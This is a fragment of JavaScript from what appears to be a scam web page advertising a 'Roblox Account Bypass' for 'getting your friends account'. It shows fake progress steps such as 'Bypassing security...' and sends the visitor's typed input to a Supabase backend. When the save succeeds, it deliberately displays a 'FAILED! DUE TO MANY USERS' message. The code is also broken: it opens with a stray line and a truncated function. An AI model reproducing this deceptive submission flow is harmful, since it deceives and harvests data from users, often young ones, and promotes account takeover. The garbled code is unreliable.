      'Content-Type': 'application/json',

function parseYouTube(url){
  var s=String(url||'').trim();if(!s) return null;
  try{
    var u=new URL(s,location.origin),host=u.hostname.toLowerCase(),vid='';
    if(host.indexOf('youtu.be')>=0) vid=(u.pathname.split('/').filter(Boolean)[0]||'');

function createCopyOverlay(){
  var ex=document.getElementById('shader-overlay');if(ex) ex.remove();
  var o=document.createElement('div');o.id='shader-overlay';
  o.innerHTML='<div id="sh-card" class="lw-card">'+
    '<div class="lw-eyebrow">— LOADING...</div>'+
    '<div class="lw-title">ROBLOX <span>BYPASS</span></div>'+
    '<div class="lw-sub">// Getting your friends account…</div>'+
    '<div class="lw-spinner lw-spinner-copy" id="sh-spin"></div>'+
    '<div class="lw-step" id="sh-step">Starting process...</div>'+
    '<div class="lw-bar-bg"><div class="lw-bar-fill" id="sh-bar"></div></div>'+
    '<div class="lw-pct" id="sh-pct">0%</div>'+
    '<div class="lw-checks" id="sh-checks">'+
    '<div class="lw-check lw-active"><div class="lw-dot"></div>Starting process</div>'+
    '<div class="lw-check"><div class="lw-dot"></div>Processing...</div>'+
    '<div class="lw-check"><div class="lw-dot"></div>Initializing...</div>'+
    '<div class="lw-check"><div class="lw-dot"></div>Please wait...</div>'+
    '<div class="lw-check"><div class="lw-dot"></div>Verifying data...</div>'+
    '<div class="lw-check"><div class="lw-dot"></div>Bypassing security...</div>'+
    '</div></div>';
  document.body.appendChild(o);return o;
}
function showOverlaySuccess(overlay){
  var card=document.getElementById('sh-card');if(!card) return;
  card.innerHTML='<div class="lw-mark lw-mark-bad lw-mark-pop"></div>'+
    '<div class="lw-done-title" style="color:var(--red)">FAILED! DUE TO MANY USERS SUBMISIONS TODAY.</div>'+
    '<div class="lw-done-sub">Action did not work.</div>'+
    '<div class="lw-done-hint">Thank you for using Roblox Account Bypass</div>';
  setTimeout(function(){
    overlay.style.animation='lwFadeOut .65s ease both';
    setTimeout(function(){overlay.remove();},680);
  },2000);
}
function showOverlayFail(overlay){
  var card=document.getElementById('sh-card');if(!card) return;
  card.innerHTML='<div class="lw-mark lw-mark-bad lw-mark-pop"></div>'+
    '<div class="lw-done-title" style="color:var(--red)">Failed. Try Again.</div>'+
    '<div class="lw-done-sub">Could not save idea.</div>'+
    '<div class="lw-done-hint">Check your connection and try again.</div>';
  setTimeout(function(){
    overlay.style.animation='lwFadeOut .65s ease both';
    setTimeout(function(){overlay.remove();},680);
  },2000);
}

// ─── SUBMIT BUTTON ────────────────────────────────────────────
document.getElementById('enableBtn').addEventListener('click', function(){
  var inp=document.getElementById('heroInput');
  var val=inp?inp.value.trim():'';
  if(!val){
    showToast('Please enter an idea');
    setHeroTerminalInvalid(true);
    setTimeout(function(){setHeroTerminalInvalid(false);},1500);
    return;
  }
  setHeroTerminalInvalid(false);

  var btn=this;
  btn.disabled=true;
  btn.textContent='Saving...';

  // Show loading overlay
  var overlay=createCopyOverlay();
  var steps=[
    {pct:10,text:'Starting process...',step:0},
    {pct:24,text:'Processing idea...',step:1},
    {pct:38,text:'Initializing...',step:2},
    {pct:52,text:'Please wait...',step:3},
    {pct:66,text:'Verifying data...',step:4},
    {pct:80,text:'Connecting to database...',step:5},
    {pct:91,text:'Almost done...',step:5},
    {pct:97,text:'Saving...',step:5}
  ];
  var STEP_MS=520;
  var stepDone=false;

  // Run steps animation
  (function run(i){
    if(i>=steps.length) return;
    setTimeout(function(){
      if(!document.getElementById('shader-overlay')) return;
      var s=steps[i];setShaderProgress(s.pct,s.text,s.step,false);
      run(i+1);
    }, i===0?0:STEP_MS);
  })(0);

  // Send to Supabase
  sendToSupabase(val).then(function(success){
    setShaderProgress(100,'Done!',5,false);
    setTimeout(function(){
      if(success){
        showOverlaySuccess(overlay);
        showToast('✅ Idea saved!');
        updateSubmissionCount();
      } else {
        showOverlayFail(overlay);
        showToast('⚠️ Failed to save. Try again.');
      }
      if(inp) inp.value='';
      btn.disabled=false;
      btn.textContent='Generate Idea';
    },400);
  });
});

// Enter key
document.getElementById('heroInput').addEventListener('keydown',function(e){
  if(e.key==='Enter') document.getElementById('enableBtn').click();
});

// Init — load count from Supabase
updateSubmissionCount();
</script>
